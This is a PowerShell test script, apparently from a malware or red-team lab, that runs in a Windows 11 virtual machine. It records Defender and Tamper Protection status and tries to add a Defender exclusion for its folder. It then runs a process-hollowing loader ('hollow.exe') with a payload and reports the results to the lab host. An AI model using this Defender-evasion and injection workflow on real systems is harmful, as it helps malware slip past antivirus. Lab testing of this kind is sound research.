# test.ps1 — roda dentro do guest (Windows 11 24H2) no primeiro logon.
# Coleta estado, executa o loader e devolve o resultado pro host via slirp.

$ErrorActionPreference = 'Continue'
$log = 'C:\lab\test.log'
New-Item -ItemType Directory -Force -Path 'C:\lab' | Out-Null
Set-Content -Path $log -Value '' -Encoding UTF8

function Log([string]$m) {
    $line = "[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m
    Add-Content -Path $log -Value $line -Encoding UTF8
}

function Post([string]$path) {
    try {
        $body = (Get-Content $log -Raw) + "`n--- marker ---`n" + (Get-Marker)
        Invoke-WebRequest -Uri ("http://10.0.2.2:8000/" + $path) -Method POST `
            -Body $body -UseBasicParsing -TimeoutSec 10 | Out-Null
    } catch { Log "post_fail=$($_.Exception.Message)" }
}

function Get-Marker {
    $p = Join-Path $env:TEMP 'hollow_marker.txt'
    if (Test-Path $p) { return (Get-Content $p -Raw) }
    return 'ABSENT'
}

$src = $PSScriptRoot
Log "src=$src"
Log ("os=" + (Get-CimInstance Win32_OperatingSystem).Caption + " build=" + [Environment]::OSVersion.Version.Build)
Log ("elevated=" + ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))

$tp = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -ErrorAction SilentlyContinue).TamperProtection
Log "tamper_raw=$tp"

try {
    $mp = Get-MpComputerStatus -ErrorAction Stop
    Log ("defender_rt=" + $mp.RealTimeProtectionEnabled + " av=" + $mp.AntivirusEnabled)
} catch { Log ("defender_query_fail=" + $_.Exception.Message) }

Copy-Item "$src\*.exe" 'C:\lab\' -Force -ErrorAction SilentlyContinue
Copy-Item "$src\*.ps1" 'C:\lab\' -Force -ErrorAction SilentlyContinue

# Tenta excluir o diretorio (falha com Tamper Protection ligado)
try {
    Add-MpPreference -ExclusionPath 'C:\lab' -ErrorAction Stop
    Log 'exclusion=ok'
} catch { Log ("exclusion=fail: " + $_.Exception.Message) }

Log '---- run: --dry-run ----'
$d = Start-Process -FilePath 'C:\lab\hollow.exe' -ArgumentList '--dry-run','--payload','payload.exe' `
    -Wait -PassThru -NoNewWindow -RedirectStandardOutput 'C:\lab\dry.out' -RedirectStandardError 'C:\lab\dry.err'
Log "dry_exit=$($d.ExitCode)"
Log ((Get-Content 'C:\lab\dry.out' -Raw) + (Get-Content 'C:\lab\dry.err' -Raw))

Log '---- run: overwrite ----'
$r = Start-Process -FilePath 'C:\lab\hollow.exe' -ArgumentList '--payload','payload.exe' `
    -Wait -PassThru -NoNewWindow -RedirectStandardOutput 'C:\lab\hollow.out' -RedirectStandardError 'C:\lab\hollow.err'
Log "hollow_exit=$($r.ExitCode)"
Log ((Get-Content 'C:\lab\hollow.out' -Raw) + (Get-Content 'C:\lab\hollow.err' -Raw))

Start-Sleep -Seconds 5

Log ("marker=" + (Get-Marker))

# Prova de processo: quem esta rodando e com qual imagem mapeada
try {
    Get-Process | Where-Object { $_.ProcessName -match 'rundll32|calc' } |
        ForEach-Object { Log ("proc=" + $_.ProcessName + " pid=" + $_.Id + " path=" + $_.Path) }
} catch { }

Log '---- done ----'
Post 'report'
